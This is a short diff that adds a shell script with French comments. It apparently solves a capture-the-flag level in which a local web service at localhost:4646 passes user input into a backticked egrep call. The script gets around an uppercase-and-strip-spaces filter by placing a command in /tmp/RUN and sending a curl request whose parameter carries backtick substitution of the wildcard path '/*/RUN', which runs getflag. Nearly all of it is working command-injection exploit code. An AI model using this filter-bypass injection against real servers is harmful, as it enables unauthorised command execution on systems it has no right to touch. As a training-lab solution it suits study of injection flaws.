@@ -1,0 +1,10 @@
+# tr/a-z/A-Z -> Transforme en majuscule
+# s/\s.*//; -> Retire les espaces
+
+# `egrep "^$xx" /tmp/xd 2>&1` => execute
+# il faut remplacer $xx pour lancer getflag
+
+# `egrep "^``/*/RUN``" /tmp/xd 2>&1`
+echo "getflag > /tmp/flag" > /tmp/RUN
+curl 'localhost:4646?x=\`/*/RUN\`'
+cat /tmp/flag
